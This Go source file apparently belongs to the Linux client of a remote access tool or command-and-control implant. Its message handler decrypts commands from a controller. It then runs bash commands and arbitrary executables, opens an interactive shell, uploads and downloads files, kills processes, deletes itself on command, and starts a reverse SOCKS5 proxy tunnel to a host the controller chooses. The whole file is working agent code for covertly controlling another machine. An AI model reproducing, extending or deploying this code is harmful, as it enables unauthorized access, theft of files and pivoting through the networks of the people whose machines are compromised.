//go:build linux
// +build linux

package ws

import (
	"fmt"
	"io/ioutil"
	"main/Encrypt"
	"main/PcInfo"
	"main/util/setchannel"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"

	Function "main/Helper/function"
	"main/Helper/handle"
	Proxy "main/Helper/proxy"
	"main/MessagePack"
)

var ProcessPath string
var FilePath string

func Read[T any](Data []byte, Connection T, SendData func([]byte, T)) {
	unmsgpack := new(MessagePack.MsgPack)
	deData, err := Encrypt.Decrypt(Data)
	if err != nil {
		return
	}

	unmsgpack.DecodeFromBytes(deData)
	//fmt.Print(string(deData))
	switch unmsgpack.ForcePathObject("Pac_ket").GetAsString() {

	case "OSshell":

		cmd := exec.Command("bash", "-c", unmsgpack.ForcePathObject("Command").GetAsString())
		result := ""
		output, err := cmd.Output()
		if err != nil {
			//Log(err.Error(),Connection,SendData, *unmsgpack)
			result = err.Error()
		}
		result = string(output)
		Function.SessionLog(result, "", Connection, SendData, unmsgpack)
	case "getDrivers":
		{
			handle.GetDrivers(Connection, SendData, unmsgpack)
		}

	case "GetCurrentPath":
		{
			handle.GetCurrentPath(Connection, SendData, unmsgpack)
		}

	case "CheckAV":
		{

		}
	case "getPath":
		{
			handle.GetCurrentPath(Connection, SendData, unmsgpack)
			//handle.RefreshDir(Connection, SendData, unmsgpack)
		}
	case "renameFile":
		{
			handle.RenameFile(unmsgpack.ForcePathObject("OldName").GetAsString(), unmsgpack.ForcePathObject("NewName").GetAsString())
		}

	case "execute":
		{
			cmd := exec.Command(unmsgpack.ForcePathObject("ExecFilePath").GetAsString())
			cmd.Stdout = os.Stdout
			cmd.Stderr = os.Stderr
			cmd.Start()
		}

	case "process":
		{
			handle.ProcessInfo(Connection, SendData, unmsgpack)
		}

	case "processKill":
		{
			PID := unmsgpack.ForcePathObject("PID").GetAsString()
			pid, err := strconv.Atoi(PID)
			handle.KillProcess(pid)
			if err != nil {
				Function.SessionLog(err.Error(), "", Connection, SendData, unmsgpack)
			} else {
				Function.SessionLog("Process %d killed.\n", "", Connection, SendData, unmsgpack)
			}
			handle.ProcessInfo(Connection, SendData, unmsgpack)
		}

	case "FileRead":
		{
			handle.FileRead(Connection, SendData, unmsgpack)
		}

	case "deleteFile":
		{
			handle.DeleteFile(Connection, SendData, unmsgpack)
		}

	case "cutFile":
		{
			handle.CutFile(strings.ReplaceAll(unmsgpack.ForcePathObject("CopyFilePath").GetAsString(), "\\", "/"), strings.ReplaceAll(unmsgpack.ForcePathObject("PasteFilePath").GetAsString(), "\\", "/"))
			handle.RefreshDir(Connection, SendData, unmsgpack)
		}

	case "pasteFile":
		{
			handle.PasteFile(unmsgpack.ForcePathObject("CopyFilePath").GetAsString(), unmsgpack.ForcePathObject("PasteFilePath").GetAsString())

			handle.RefreshDir(Connection, SendData, unmsgpack)
		}

	case "UploadFile":
		{
			fullPath := filepath.Join(unmsgpack.ForcePathObject("UploaFilePath").GetAsString(), unmsgpack.ForcePathObject("Name").GetAsString())
			normalizedPathStr := strings.ReplaceAll(fullPath, "\\", "/")
			err := ioutil.WriteFile(normalizedPathStr, unmsgpack.ForcePathObject("FileBin").GetAsBytes(), 0644)
			if err != nil {
				Function.SessionLog("File writing failed! , please elevate privileges", "", Connection, SendData, unmsgpack)
			}
			handle.RefreshDir(Connection, SendData, unmsgpack)
		}

	case "downloadFile":
		{
			FilePath := unmsgpack.ForcePathObject("FilePath").GetAsString()
			normalizedPathStr := strings.ReplaceAll(FilePath, "\\", "/")
			data, err := ioutil.ReadFile(normalizedPathStr)
			if err != nil {

				msgpack := new(MessagePack.MsgPack)
				msgpack.ForcePathObject("Pac_ket").SetAsString("fileError")
				msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
				msgpack.ForcePathObject("DWID").SetAsString(unmsgpack.ForcePathObject("DWID").GetAsString())
				msgpack.ForcePathObject("Controler_HWID").SetAsString(unmsgpack.ForcePathObject("HWID").GetAsString())
				msgpack.ForcePathObject("Message").SetAsString(err.Error())
				msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
				SendData(msgpack.Encode2Bytes(), Connection)

			} else {
				msgpack := new(MessagePack.MsgPack)
				msgpack.ForcePathObject("Pac_ket").SetAsString("fileDownload")
				msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
				msgpack.ForcePathObject("DWID").SetAsString(unmsgpack.ForcePathObject("DWID").GetAsString())
				msgpack.ForcePathObject("Controler_HWID").SetAsString(unmsgpack.ForcePathObject("HWID").GetAsString())
				msgpack.ForcePathObject("FileName").SetAsString(unmsgpack.ForcePathObject("FileName").GetAsString())
				msgpack.ForcePathObject(("Data")).SetAsBytes(data)
				msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
				msgpack.ForcePathObject("HWID").SetAsString(PcInfo.GetHWID())
				SendData(msgpack.Encode2Bytes(), Connection)
			}
		}

	case "NewFolder":
		err := os.MkdirAll(unmsgpack.ForcePathObject("NewFolderName").GetAsString(), 0755)
		if err != nil {
			fmt.Printf("Error creating directory: %v\n", err)
		}

	case "NewFile":
		{
			file, err := os.Create(unmsgpack.ForcePathObject("NewFileName").GetAsString())
			if err != nil {
				Function.SessionLog(err.Error(), "", Connection, SendData, unmsgpack)
				return
			}
			defer file.Close()
			result, err := handle.ListDir(unmsgpack.ForcePathObject("FileDir").GetAsString())
			if err != nil {
				Function.SessionLog(err.Error(), "", Connection, SendData, unmsgpack)
				return
			}
			msgpack := new(MessagePack.MsgPack)
			msgpack.ForcePathObject("Pac_ket").SetAsString("GetCurrentPath")
			msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
			msgpack.ForcePathObject("Controler_HWID").SetAsString(unmsgpack.ForcePathObject("HWID").GetAsString())
			msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
			msgpack.ForcePathObject(("CurrentPath")).SetAsString(unmsgpack.ForcePathObject("FileDir").GetAsString())
			msgpack.ForcePathObject("File").SetAsString(result)
			SendData(msgpack.Encode2Bytes(), Connection)
		}

	case "ZIP":
		{
			filename := unmsgpack.ForcePathObject("FileName").GetAsString()
			err := handle.Zip(filename, filename+".zip")
			if err != nil {
				Function.SessionLog(err.Error(), "", Connection, SendData, unmsgpack)
			}
		}
	case "UNZIP":
		{
			filename := unmsgpack.ForcePathObject("FileName").GetAsString()
			if !strings.HasSuffix(filename, ".zip") {
				Function.SessionLog("FileName does not end with .zip", "", Connection, SendData, unmsgpack)
				return
			}
			err := handle.Unzip(filename, strings.ReplaceAll(filename, ".zip", ""))
			if err != nil {
				Function.SessionLog((err.Error()), "", Connection, SendData, unmsgpack)
			}

		}

	case "NetWork":
		{
			msgpack := new(MessagePack.MsgPack)
			msgpack.ForcePathObject("Pac_ket").SetAsString("NetWorkInfo")
			msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
			msgpack.ForcePathObject("Controler_HWID").SetAsString(unmsgpack.ForcePathObject("HWID").GetAsString())
			msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
			msgpack.ForcePathObject("NetWorkInfoList").SetAsString(handle.Network())
			SendData(msgpack.Encode2Bytes(), Connection)
		}

	case "NoteAdd":
		{
			PcInfo.RemarkContext = unmsgpack.ForcePathObject("RemarkContext").GetAsString()
			PcInfo.RemarkColor = unmsgpack.ForcePathObject("RemarkColor").GetAsString()
		}
	case "Group":
		{
			PcInfo.GroupInfo = unmsgpack.ForcePathObject("GroupInfo").GetAsString()
		}

	case "option":
		{
			switch unmsgpack.ForcePathObject("Command").GetAsString() {
			case "Disconnnect":
				{
					os.Exit(0)
				}
			}
		}

	case "ClientUnstaller":
		{
			exe, err := os.Executable()
			if err != nil {
				panic(err)
			}
			//fmt.Println(exe)
			os.Remove(exe)
			os.Exit(0)
		}
	case "ClientReboot":
		{
			exe, err := os.Executable()
			if err != nil {

			}
			cmd := exec.Command(exe)
			cmd.Stdout = os.Stdout
			cmd.Stderr = os.Stderr
			err = cmd.Start()

			os.Exit(0)

		}
	case "shell":
		{
			go handle.PtyCmd(unmsgpack.ForcePathObject("HWID").GetAsString(), unmsgpack, Connection, SendData)
			break
		}
	case "shellWriteInput":
		{
			sendUserId := unmsgpack.ForcePathObject("HWID").GetAsString()
			m, exist := setchannel.GetPtyDataChan(sendUserId)
			if !exist {
				m = make(chan interface{})
				setchannel.AddPtyDataChan(sendUserId, m)
			}
			m <- []byte(strings.Replace(unmsgpack.ForcePathObject("WriteInput").GetAsString(), "\r\n", "", -1) + "\n")
		}

	case "ReverseProxy":
		{
			Host := unmsgpack.ForcePathObject("Host").GetAsString()
			TunnelPort := unmsgpack.ForcePathObject("TunnelPort").GetAsString()
			Socks5Port := unmsgpack.ForcePathObject("Socks5Port").GetAsString()
			HPID := unmsgpack.ForcePathObject("HPID").GetAsString()
			UserName := unmsgpack.ForcePathObject("UserName").GetAsString()
			Password := unmsgpack.ForcePathObject("Password").GetAsString()
			Proxy.ReverseSocksAgent(Host+":"+TunnelPort, "password", false, Connection, SendData, TunnelPort, Socks5Port, HPID, UserName, Password)
		}

	}
}
